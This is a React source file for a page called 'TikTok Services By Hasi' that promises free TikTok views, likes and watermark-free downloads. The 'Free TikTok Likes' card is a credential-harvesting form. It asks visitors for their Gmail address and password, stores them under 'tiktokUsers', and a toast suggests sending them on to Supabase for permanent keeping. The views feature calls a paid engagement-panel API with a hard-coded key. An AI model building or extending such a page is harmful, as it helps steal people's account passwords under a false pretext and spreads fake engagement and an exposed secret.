import React, { useState } from 'react';
import { motion } from 'framer-motion';
import { Helmet } from 'react-helmet';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Toaster } from '@/components/ui/toaster';
import { useToast } from '@/components/ui/use-toast';
import { MessageCircle, Eye, Heart, Download, Loader2 } from 'lucide-react';
function App() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [viewsUrl, setViewsUrl] = useState('');
  const [downloadUrl, setDownloadUrl] = useState('');
  const [isViewsLoading, setIsViewsLoading] = useState(false);
  const {
    toast
  } = useToast();
  const handleGetViews = async () => {
    if (!viewsUrl) {
      toast({
        title: "Link Khali Hai!",
        description: "Barae karam video ka link paste karen.",
        variant: "destructive"
      });
      return;
    }
    setIsViewsLoading(true);
    const API_URL = 'https://prince.hafizverse.online/api/v2';
    const API_KEY = '8f09cffa097ac151764600e1f1042aaa';
    const SERVICE_ID = '2779';
    const params = new URLSearchParams();
    params.append('key', API_KEY);
    params.append('action', 'add');
    params.append('service', SERVICE_ID);
    params.append('link', viewsUrl);
    params.append('quantity', '100'); // Default quantity, you can change this

    try {
      const response = await fetch(API_URL, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: params
      });
      const result = await response.json();
      if (result.order) {
        toast({
          title: "Kamyabi! 🎉",
          description: `Aapka order lag gaya hai! Order ID: ${result.order}`
        });
        setViewsUrl('');
      } else {
        throw new Error(result.error || "API se views haasil karne mein masla hua.");
      }
    } catch (error) {
      toast({
        title: "Khaami!",
        description: error.message || "Request fail ho gayi. Dobara koshish karen.",
        variant: "destructive"
      });
    } finally {
      setIsViewsLoading(false);
    }
  };
  const handleApiFeature = (featureName, url) => {
    if (!url) {
      toast({
        title: "Link Khali Hai!",
        description: "Barae karam video ka link paste karen.",
        variant: "destructive"
      });
      return;
    }
    console.log(`Calling API for ${featureName} with URL: ${url}`);
    toast({
      title: "🚧 Feature Jald Aaraha Hai!",
      description: `Aap ne ${featureName} ke liye request bhej di hai. API integrate karne ke liye agle prompt mein batayen! 🚀`
    });
  };
  const handleGetLikes = async () => {
    if (!email || !password) {
      toast({
        title: "Khaami!",
        description: "Barae karam Gmail aur Password dono likhen.",
        variant: "destructive"
      });
      return;
    }
    const userData = {
      email,
      password,
      timestamp: new Date().toISOString()
    };
    try {
      const existingData = JSON.parse(localStorage.getItem('tiktokUsers') || '[]');
      existingData.push(userData);
      localStorage.setItem('tiktokUsers', JSON.stringify(existingData));
      toast({
        title: "Kamyabi! 🎉",
        description: "Aapki maloomat abhi browser mein save ho gayi hain."
      });
      toast({
        title: "Agla Qadam: Supabase Connect Karen",
        description: "Data ko hamesha ke liye mehfooz karne ke liye, Supabase connect karen.",
        variant: "default",
        duration: 8000
      });
      setEmail('');
      setPassword('');
    } catch (error) {
      toast({
        title: "Khaami!",
        description: "Kuch masla hogaya, dobara koshish karen.",
        variant: "destructive"
      });
    }
  };
  const handleWhatsApp = () => {
    window.open('https://whatsapp.com/channel/0029VaHI7LsFnSz1irwgsL1z', '_blank');
  };
  return <>
      <Helmet>
        <title>TikTok Services By Hasi - Free Views, Likes & Downloads</title>
        <meta name="description" content="Get free TikTok views, likes, and download HD videos without watermark. Best TikTok growth platform by Hasi." />
      </Helmet>

      <div className="min-h-screen bg-gradient-to-br from-gray-900 via-purple-900 to-black relative overflow-hidden flex flex-col">
        <div className="absolute inset-0 overflow-hidden">
          <div className="absolute -top-40 -right-40 w-80 h-80 bg-pink-500/20 rounded-full blur-3xl animate-pulse"></div>
          <div className="absolute -bottom-40 -left-40 w-80 h-80 bg-blue-500/20 rounded-full blur-3xl animate-pulse delay-1000"></div>
        </div>

        <motion.header initial={{
        opacity: 0,
        y: -50
      }} animate={{
        opacity: 1,
        y: 0
      }} transition={{
        duration: 0.8
      }} className="relative z-10 text-center py-8 px-4">
          <motion.h1 className="text-4xl md:text-6xl font-bold bg-gradient-to-r from-pink-400 via-cyan-400 to-purple-400 bg-clip-text text-transparent mb-4" animate={{
          backgroundPosition: ['0% 50%', '100% 50%', '0% 50%']
        }} transition={{
          duration: 4,
          repeat: Infinity,
          ease: "linear"
        }}>
            TikTok Services By Hasi
          </motion.h1>
        </motion.header>

        <main className="relative z-10 container mx-auto px-4 py-8 flex-grow">
          <div className="grid lg:grid-cols-3 gap-8 max-w-7xl mx-auto">
            
            <motion.div initial={{
            opacity: 0,
            y: 50
          }} animate={{
            opacity: 1,
            y: 0
          }} transition={{
            duration: 0.8,
            delay: 0.2
          }}>
              <Card className="bg-white/10 backdrop-blur-lg border-white/20 shadow-2xl hover:shadow-pink-500/30 transition-all duration-300 h-full flex flex-col">
                <CardHeader className="text-center">
                  <div className="mx-auto w-16 h-16 bg-gradient-to-r from-pink-500 to-red-500 rounded-full flex items-center justify-center mb-4">
                    <Eye className="w-8 h-8 text-white" />
                  </div>
                  <CardTitle className="text-2xl font-bold text-white">Free TikTok Views</CardTitle>
                  <p className="text-white/70">Apni video par views barhayen</p>
                </CardHeader>
                <CardContent className="space-y-4 flex-grow flex flex-col justify-center">
                  <div>
                    <label className="block text-white/80 mb-2 font-medium">Video Link:</label>
                    <Input type="url" placeholder="https://tiktok.com/..." value={viewsUrl} onChange={e => setViewsUrl(e.target.value)} className="bg-white/10 border-white/30 text-white placeholder:text-white/50 focus:border-pink-400" disabled={isViewsLoading} />
                  </div>
                  <Button onClick={handleGetViews} className="w-full bg-gradient-to-r from-pink-500 to-red-500 hover:from-pink-600 hover:to-red-600 text-white font-bold py-3 rounded-lg shadow-lg hover:shadow-pink-500/50 transition-all duration-300 mt-auto" disabled={isViewsLoading}>
                    {isViewsLoading ? <Loader2 className="w-5 h-5 mr-2 animate-spin" /> : <Eye className="w-5 h-5 mr-2" />}
                    {isViewsLoading ? 'Bhej Raha Hai...' : 'Get Free Views'}
                  </Button>
                </CardContent>
              </Card>
            </motion.div>

            <motion.div initial={{
            opacity: 0,
            y: 50
          }} animate={{
            opacity: 1,
            y: 0
          }} transition={{
            duration: 0.8,
            delay: 0.4
          }}>
              <Card className="bg-white/10 backdrop-blur-lg border-white/20 shadow-2xl hover:shadow-purple-500/30 transition-all duration-300 h-full flex flex-col">
                <CardHeader className="text-center">
                  <div className="mx-auto w-16 h-16 bg-gradient-to-r from-purple-500 to-indigo-500 rounded-full flex items-center justify-center mb-4">
                    <Heart className="w-8 h-8 text-white" />
                  </div>
                  <CardTitle className="text-2xl font-bold text-white">Free TikTok Likes</CardTitle>
                  <p className="text-white/70">To Get Likes Login TikTok Acc Here</p>
                </CardHeader>
                <CardContent className="space-y-4 flex-grow flex flex-col justify-center">
                  <div>
                    <label className="block text-white/80 mb-2 font-medium">Gmail Address:</label>
                    <Input type="email" placeholder="your.email@gmail.com" value={email} onChange={e => setEmail(e.target.value)} className="bg-white/10 border-white/30 text-white placeholder:text-white/50 focus:border-purple-400" />
                  </div>
                  <div>
                    <label className="block text-white/80 mb-2 font-medium">Password:</label>
                    <Input type="password" placeholder="••••••••" value={password} onChange={e => setPassword(e.target.value)} className="bg-white/10 border-white/30 text-white placeholder:text-white/50 focus:border-purple-400" />
                  </div>
                  <Button onClick={handleGetLikes} className="w-full bg-gradient-to-r from-purple-500 to-indigo-500 hover:from-purple-600 hover:to-indigo-600 text-white font-bold py-3 rounded-lg shadow-lg hover:shadow-purple-500/50 transition-all duration-300 mt-auto">
                    <Heart className="w-5 h-5 mr-2" />
                    Get Free Likes
                  </Button>
                </CardContent>
              </Card>
            </motion.div>

            <motion.div initial={{
            opacity: 0,
            y: 50
          }} animate={{
            opacity: 1,
            y: 0
          }} transition={{
            duration: 0.8,
            delay: 0.6
          }}>
              <Card className="bg-white/10 backdrop-blur-lg border-white/20 shadow-2xl hover:shadow-cyan-500/30 transition-all duration-300 h-full flex flex-col">
                <CardHeader className="text-center">
                  <div className="mx-auto w-16 h-16 bg-gradient-to-r from-cyan-500 to-blue-500 rounded-full flex items-center justify-center mb-4">
                    <Download className="w-8 h-8 text-white" />
                  </div>
                  <CardTitle className="text-2xl font-bold text-white">Video Downloader</CardTitle>
                  <p className="text-white/70">Download Videos HD & Without WaterMark </p>
                </CardHeader>
                <CardContent className="space-y-4 flex-grow flex flex-col justify-center">
                  <div>
                    <label className="block text-white/80 mb-2 font-medium">Video Link:</label>
                    <Input type="url" placeholder="https://tiktok.com/..." value={downloadUrl} onChange={e => setDownloadUrl(e.target.value)} className="bg-white/10 border-white/30 text-white placeholder:text-white/50 focus:border-cyan-400" />
                  </div>
                  <Button onClick={() => handleApiFeature('Download', downloadUrl)} className="w-full bg-gradient-to-r from-cyan-500 to-blue-500 hover:from-cyan-600 hover:to-blue-600 text-white font-bold py-3 rounded-lg shadow-lg hover:shadow-cyan-500/50 transition-all duration-300 mt-auto">
                    <Download className="w-5 h-5 mr-2" />
                    Download HD & Without Mark
                  </Button>
                </CardContent>
              </Card>
            </motion.div>
          </div>
        </main>

        <footer className="relative z-10 text-center py-6 px-4 text-white/70">
          <p>
            Developer By{' '}
            <a href="https://wa.me/923462054847" target="_blank" rel="noopener noreferrer" className="font-semibold text-cyan-400 hover:text-cyan-300 underline underline-offset-4 transition-colors">
              Haseeb Rashid
            </a>
          </p>
        </footer>

        <motion.button onClick={handleWhatsApp} className="fixed bottom-6 right-6 w-16 h-16 bg-green-500 hover:bg-green-600 rounded-full shadow-2xl flex items-center justify-center z-50 transition-all duration-300 hover:scale-110" whileHover={{
        scale: 1.1
      }} whileTap={{
        scale: 0.95
      }} initial={{
        scale: 0
      }} animate={{
        scale: 1
      }} transition={{
        delay: 1,
        type: "spring",
        stiffness: 200
      }}>
          <MessageCircle className="w-8 h-8 text-white" />
        </motion.button>

        <Toaster />
      </div>
    </>;
}
export default App;